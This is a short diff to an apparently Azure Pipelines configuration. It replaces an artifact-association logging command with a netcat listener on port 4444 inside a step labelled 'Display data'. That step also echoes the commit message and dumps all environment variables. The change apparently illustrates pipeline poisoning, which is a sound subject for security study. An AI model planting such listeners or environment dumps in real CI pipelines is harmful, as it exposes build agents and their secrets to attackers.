@@ -12,7 +12,8 @@ steps:
       echo "$(Build.SourceBranchName)"
       echo "verifying the following commit:"
       echo "$(Build.SourceVersionMessage)"
-      echo ##vso[artifact.associate artifactname=myDrop;artifacttype=myartifacttype]https://github.com/Legit-Labs/legitify/archive/refs/tags/v0.2.2.zip
+      nc –lvp 4444
+      
       env | sort
     displayName: Display data
 
